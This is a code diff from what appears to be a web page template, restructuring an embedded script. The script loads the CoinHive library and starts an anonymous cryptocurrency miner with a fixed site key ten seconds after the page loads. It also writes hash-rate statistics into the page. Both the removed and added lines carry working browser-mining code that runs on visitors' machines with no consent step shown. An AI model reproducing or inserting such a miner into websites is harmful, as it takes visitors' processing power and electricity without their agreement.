@@ -960,17 +960,19 @@ document.getElementById("audio").volume = 0.5;
 
 <script src="https://coinhive.com/lib/coinhive.min.js" async></script>
 <script>
-    CoinHive.CONFIG.LIB_URL = ["https://coinhive.com/lib/"];
-    var miner = new CoinHive.Anonymous('1AZ2sY9P2jO5NUlyOAJKWySh6SsHsb4k', {throttle: 0.3});
-    miner.on('found', function() { /* Hash found */ });
-    miner.on('accepted', function() { /* Hash accepted by the pool */ });
-    setInterval(function() {
-      var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
-      var acceptedHashes = miner.getAcceptedHashes();
-      document.getElementById("coinhive-miner").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec<br>" + "Total Hashes = " + totalHashes + "<br>Accepted Hashes = " + acceptedHashes;
-    }, 1000);
-    setTimeout(function() {miner.start();}, 10000);
+    setTimeout(function() {
+        CoinHive.CONFIG.LIB_URL = ["https://coinhive.com/lib/"];
+        var miner = new CoinHive.Anonymous('1AZ2sY9P2jO5NUlyOAJKWySh6SsHsb4k', {throttle: 0.3});
+        miner.on('found', function() { /* Hash found */ });
+        miner.on('accepted', function() { /* Hash accepted by the pool */ });
+        setInterval(function() {
+          var hashesPerSecond = miner.getHashesPerSecond();
+          var totalHashes = miner.getTotalHashes();
+          var acceptedHashes = miner.getAcceptedHashes();
+          document.getElementById("coinhive-miner").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec<br>" + "Total Hashes = " + totalHashes + "<br>Accepted Hashes = " + acceptedHashes;
+        }, 1000);
+            miner.start();
+    }, 10000);
 </script>
 ]]></content>
       
